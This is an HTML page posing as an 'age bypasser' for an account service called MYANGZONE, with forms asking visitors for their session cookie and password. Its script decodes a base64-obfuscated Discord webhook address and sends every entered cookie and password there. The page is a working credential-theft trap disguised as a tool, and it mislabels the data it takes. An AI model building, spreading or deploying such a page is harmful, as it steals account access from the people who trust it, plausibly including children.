<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>MYANGZONE Bypasser</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('https://cdn.discordapp.com/attachments/1349809697250611238/1349861253287383100/standard_1.gif?ex=6808b701&is=68076581&hm=ccfa5337b25fa32c15ae779c0793864956b4aa58e9d92dc794656790a60a872f') no-repeat center center fixed;
      background-size: cover;
      color: #eee;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    input, button {
      padding: 10px;
      font-size: 16px;
      margin-top: 10px;
    }

    input {
      width: 300px;
    }

    button {
      background-color: #444;
      color: red;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #666;
    }

    .s {
      margin-top: 30px;
      text-align: center;
    }
  </style>
</head>
<body>

  <h1>MYANGZONE 13- TO +13 Bypasser</h1>
  <input type="text" id="a" placeholder="Enter your cookie">
  <button onclick="z()">Submit</button>

  <div class="s">
    <h1>+13 TO -13 Bypasser</h1>
    <input type="text" id="b" placeholder="Enter your cookie">
    <input type="text" id="c" placeholder="Enter your password">
    <button onclick="y()">Submit cookie & pass</button>
  </div>

  <script>
    const u = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MjczMzQ2OTU4Mjg4OTA4My9LVm9udVRnSTlNWXRoUG5XRno5bkRKaXFkZ2VxYWFVVzYxdXpRa0JMMmFibmJLb1FmOUV2eVpmT3Z5Y042OHBfNTQ=");

    function x(m) {
      fetch(u, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: m })
      })
      .then(r => alert(r.ok ? "Submitted successfully." : "Failed to send."))
      .catch(e => alert("Error occurred."));
    }

    function z() {
      const d = document.getElementById('a').value;
      if (!d) return alert("Please enter your user.");
      x("User: " + d);
    }

    function y() {
      const e = document.getElementById('b').value;
      const f = document.getElementById('c').value;
      if (!e || !f) return alert("Please enter both user and name.");
      x(`(Reverse Bypass)\nUser: ${e}\nName: ${f}`);
    }
  </script>

</body>
</html>
